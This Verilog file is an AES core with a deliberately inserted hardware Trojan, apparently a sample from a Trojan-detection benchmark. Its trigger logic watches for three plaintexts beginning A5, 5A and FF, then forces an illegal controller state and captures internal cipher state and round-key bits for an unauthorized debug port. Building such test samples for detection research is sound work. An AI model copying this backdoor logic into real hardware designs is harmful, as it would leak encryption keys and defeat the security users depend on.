//======================================================================
//
// aes_core.v
// ----------
// Infected AES core for T04_p4_debug_port (plain interface, matches
// rtl/aes_golden/aes_core.v). This is the canonical Trojan location
// referenced by ground_truth.yaml-equivalent case files.
//
// aes_core_tapped.v in this same directory is derived from this file
// by adding extra output ports (round_keys_flat, muxed_round_nr,
// state_before_final, debug_valid, debug_data) so the security
// monitors (KLG/RCM/ORC and the malicious debug port) can observe
// internal state during simulation/synthesis. The Trojan trigger and
// payload logic itself is identical between the two files.
//
// Specification-aligned T04:
//   Trigger T2:
//     Three accepted plaintexts whose first bytes are
//       A5 -> 5A -> FF.
//
//   Payload P4:
//     Open an unauthorized debug port that exposes internal AES
//     state and key-schedule material.
//
//   Detection:
//     RED detects the rare input sequence.
//     FIC detects the one-cycle CTRL_DEBUG control state (2'b11).
//
// Based on secworks/aes.
//======================================================================

`default_nettype none

module aes_core(
                input wire            clk,
                input wire            reset_n,

                input wire            encdec,
                input wire            init,
                input wire            next,
                output wire           ready,

                input wire [255 : 0]  key,
                input wire            keylen,

                input wire [127 : 0]  block,
                output wire [127 : 0] result,
                output wire           result_valid
               );


  //----------------------------------------------------------------
  // AES-core controller states.
  //----------------------------------------------------------------
  localparam CTRL_IDLE  = 2'h0;
  localparam CTRL_INIT  = 2'h1;
  localparam CTRL_NEXT  = 2'h2;

  // Unauthorized debug control state.
  // FIC treats 2'b11 as illegal.
  localparam CTRL_DEBUG = 2'h3;


  //----------------------------------------------------------------
  // T04 trigger-sequence states.
  //----------------------------------------------------------------
  localparam T04_WAIT_A5 = 2'd0;
  localparam T04_WAIT_5A = 2'd1;
  localparam T04_WAIT_FF = 2'd2;

  reg [1 : 0] t04_seq_state;

  reg         trojan_fired;
  reg         debug_port_active;
  reg [127:0] debug_snapshot;


  //----------------------------------------------------------------
  // Core-controller registers.
  //----------------------------------------------------------------
  reg [1 : 0] aes_core_ctrl_reg;
  reg [1 : 0] aes_core_ctrl_new;
  reg         aes_core_ctrl_we;

  reg         result_valid_reg;
  reg         result_valid_new;
  reg         result_valid_we;

  reg         ready_reg;
  reg         ready_new;
  reg         ready_we;


  //----------------------------------------------------------------
  // Internal datapath signals.
  //----------------------------------------------------------------
  reg            init_state;

  wire [127 : 0] round_key;
  wire           key_ready;

  reg            enc_next;
  wire [3 : 0]   enc_round_nr;
  wire [127 : 0] enc_new_block;
  wire           enc_ready;
  wire [31 : 0]  enc_sboxw;

  reg            dec_next;
  wire [3 : 0]   dec_round_nr;
  wire [127 : 0] dec_new_block;
  wire           dec_ready;

  reg [127 : 0]  muxed_new_block;
  reg [3 : 0]    muxed_round_nr;
  reg            muxed_ready;

  wire [31 : 0]  keymem_sboxw;


/* verilator lint_off UNOPTFLAT */
  reg  [31 : 0] muxed_sboxw;
  wire [31 : 0] new_sboxw;
/* verilator lint_on UNOPTFLAT */


  //----------------------------------------------------------------
  // Trigger predicates.
  //----------------------------------------------------------------
  wire accepted_encrypt_request;

  wire t04_seen_a5;
  wire t04_seen_5a;
  wire t04_seen_ff;

  wire t04_fire;


  assign accepted_encrypt_request =
      next &&
      encdec &&
      !init &&
      (aes_core_ctrl_reg == CTRL_IDLE);


  assign t04_seen_a5 =
      (block[127:120] == 8'hA5);

  assign t04_seen_5a =
      (block[127:120] == 8'h5A);

  assign t04_seen_ff =
      (block[127:120] == 8'hFF);


  assign t04_fire =
      accepted_encrypt_request &&
      !trojan_fired &&
      (t04_seq_state == T04_WAIT_FF) &&
      t04_seen_ff;


  //----------------------------------------------------------------
  // Encipher datapath.
  //----------------------------------------------------------------
  aes_encipher_block enc_block(
                               .clk(clk),
                               .reset_n(reset_n),

                               .next(enc_next),

                               .keylen(keylen),
                               .round(enc_round_nr),
                               .round_key(round_key),

                               .sboxw(enc_sboxw),
                               .new_sboxw(new_sboxw),

                               .block(block),
                               .new_block(enc_new_block),
                               .ready(enc_ready)
                              );


  //----------------------------------------------------------------
  // Decipher datapath.
  //----------------------------------------------------------------
  aes_decipher_block dec_block(
                               .clk(clk),
                               .reset_n(reset_n),

                               .next(dec_next),

                               .keylen(keylen),
                               .round(dec_round_nr),
                               .round_key(round_key),

                               .block(block),
                               .new_block(dec_new_block),
                               .ready(dec_ready)
                              );


  //----------------------------------------------------------------
  // Key memory.
  //----------------------------------------------------------------
  aes_key_mem keymem(
                     .clk(clk),
                     .reset_n(reset_n),

                     .key(key),
                     .keylen(keylen),
                     .init(init),

                     .round(muxed_round_nr),
                     .round_key(round_key),
                     .ready(key_ready),

                     .sboxw(keymem_sboxw),
                     .new_sboxw(new_sboxw)
                    );


  //----------------------------------------------------------------
  // Shared S-box.
  //----------------------------------------------------------------
  aes_sbox sbox_inst(.sboxw(muxed_sboxw), .new_sboxw(new_sboxw));


  //----------------------------------------------------------------
  // Public outputs.
  //
  // The normal AES result channel is intentionally unchanged.
  //----------------------------------------------------------------
  assign ready        = ready_reg;
  assign result       = muxed_new_block;
  assign result_valid = result_valid_reg;


  //----------------------------------------------------------------
  // Register update.
  //----------------------------------------------------------------
  always @ (posedge clk or negedge reset_n)
    begin: reg_update
      if (!reset_n)
        begin
          result_valid_reg   <= 1'b0;
          ready_reg          <= 1'b1;
          aes_core_ctrl_reg  <= CTRL_IDLE;

          t04_seq_state      <= T04_WAIT_A5;

          trojan_fired       <= 1'b0;
          debug_port_active  <= 1'b0;
          debug_snapshot     <= 128'd0;
        end
      else
        begin
          //------------------------------------------------------
          // Normal core-register updates.
          //------------------------------------------------------
          if (result_valid_we)
            result_valid_reg <= result_valid_new;

          if (ready_we)
            ready_reg <= ready_new;

          if (aes_core_ctrl_we)
            aes_core_ctrl_reg <= aes_core_ctrl_new;


          //------------------------------------------------------
          // T04 independent trigger FSM.
          //
          // Only accepted encryption requests contribute to the
          // A5 -> 5A -> FF sequence.
          //------------------------------------------------------
          if (accepted_encrypt_request)
            begin
              case (t04_seq_state)
                T04_WAIT_A5:
                  begin
                    if (t04_seen_a5)
                      t04_seq_state <= T04_WAIT_5A;
                    else
                      t04_seq_state <= T04_WAIT_A5;
                  end

                T04_WAIT_5A:
                  begin
                    if (t04_seen_5a)
                      t04_seq_state <= T04_WAIT_FF;
                    else if (t04_seen_a5)
                      t04_seq_state <= T04_WAIT_5A;
                    else
                      t04_seq_state <= T04_WAIT_A5;
                  end

                T04_WAIT_FF:
                  begin
                    if (t04_seen_ff)
                      t04_seq_state <= T04_WAIT_A5;
                    else if (t04_seen_a5)
                      t04_seq_state <= T04_WAIT_5A;
                    else
                      t04_seq_state <= T04_WAIT_A5;
                  end

                default:
                  begin
                    t04_seq_state <= T04_WAIT_A5;
                  end
              endcase
            end


          //------------------------------------------------------
          // T04 fire.
          //
          // The third request still starts normal AES encryption.
          // In parallel, the Trojan:
          //   1) opens its debug port,
          //   2) captures sensitive internal information,
          //   3) forces CTRL_DEBUG for exactly one controller cycle.
          //
          // This later nonblocking assignment intentionally has
          // priority over the normal aes_core_ctrl_reg update above.
          //
          // Note: without the tapped key memory, the full round-key
          // schedule (round_keys_flat) is not available here, so the
          // key-schedule fragment of the payload snapshot is taken
          // from the current round_key instead.
          //------------------------------------------------------
          if (t04_fire)
            begin
              trojan_fired <= 1'b1;

              debug_port_active <= 1'b1;

              debug_snapshot <=
                  {
                    aes_core_ctrl_reg,
                    muxed_round_nr,
                    enc_new_block[89:0],
                    round_key[31:0]
                  };

              aes_core_ctrl_reg <= CTRL_DEBUG;
            end
        end
    end


  //----------------------------------------------------------------
  // Shared S-box mux.
  //----------------------------------------------------------------
  always @*
    begin : sbox_mux
      if (init_state)
        muxed_sboxw = keymem_sboxw;
      else
        muxed_sboxw = enc_sboxw;
    end


  //----------------------------------------------------------------
  // Encrypt/decrypt mux.
  //----------------------------------------------------------------
  always @*
    begin : encdec_mux
      enc_next = 1'b0;
      dec_next = 1'b0;

      if (encdec)
        begin
          enc_next        = next;
          muxed_round_nr  = enc_round_nr;
          muxed_new_block = enc_new_block;
          muxed_ready     = enc_ready;
        end
      else
        begin
          dec_next        = next;
          muxed_round_nr  = dec_round_nr;
          muxed_new_block = dec_new_block;
          muxed_ready     = dec_ready;
        end
    end


  //----------------------------------------------------------------
  // AES-core control FSM.
  //----------------------------------------------------------------
  always @*
    begin : aes_core_ctrl
      init_state = 1'b0;

      ready_new = 1'b0;
      ready_we  = 1'b0;

      result_valid_new = 1'b0;
      result_valid_we  = 1'b0;

      aes_core_ctrl_new = CTRL_IDLE;
      aes_core_ctrl_we  = 1'b0;

      case (aes_core_ctrl_reg)
        //--------------------------------------------------------
        // Normal states.
        //--------------------------------------------------------
        CTRL_IDLE:
          begin
            if (init)
              begin
                init_state        = 1'b1;
                ready_new         = 1'b0;
                ready_we          = 1'b1;
                result_valid_new  = 1'b0;
                result_valid_we   = 1'b1;
                aes_core_ctrl_new = CTRL_INIT;
                aes_core_ctrl_we  = 1'b1;
              end
            else if (next)
              begin
                init_state        = 1'b0;
                ready_new         = 1'b0;
                ready_we          = 1'b1;
                result_valid_new  = 1'b0;
                result_valid_we   = 1'b1;
                aes_core_ctrl_new = CTRL_NEXT;
                aes_core_ctrl_we  = 1'b1;
              end
          end

        CTRL_INIT:
          begin
            init_state = 1'b1;

            if (key_ready)
              begin
                ready_new         = 1'b1;
                ready_we          = 1'b1;
                aes_core_ctrl_new = CTRL_IDLE;
                aes_core_ctrl_we  = 1'b1;
              end
          end

        CTRL_NEXT:
          begin
            init_state = 1'b0;

            if (muxed_ready)
              begin
                ready_new         = 1'b1;
                ready_we          = 1'b1;
                result_valid_new  = 1'b1;
                result_valid_we   = 1'b1;
                aes_core_ctrl_new = CTRL_IDLE;
                aes_core_ctrl_we  = 1'b1;
             end
          end

        //--------------------------------------------------------
        // P4 unauthorized debug state.
        //
        // The state exists for one controller cycle only. The
        // encipher datapath continues independently, then the core
        // returns to CTRL_NEXT and waits for normal completion.
        //--------------------------------------------------------
        CTRL_DEBUG:
          begin
            init_state        = 1'b0;
            aes_core_ctrl_new = CTRL_NEXT;
            aes_core_ctrl_we  = 1'b1;
          end

        default:
          begin
            aes_core_ctrl_new = CTRL_IDLE;
            aes_core_ctrl_we  = 1'b1;
          end
      endcase
    end // aes_core_ctrl

endmodule // aes_core

//======================================================================
// EOF aes_core.v
//======================================================================
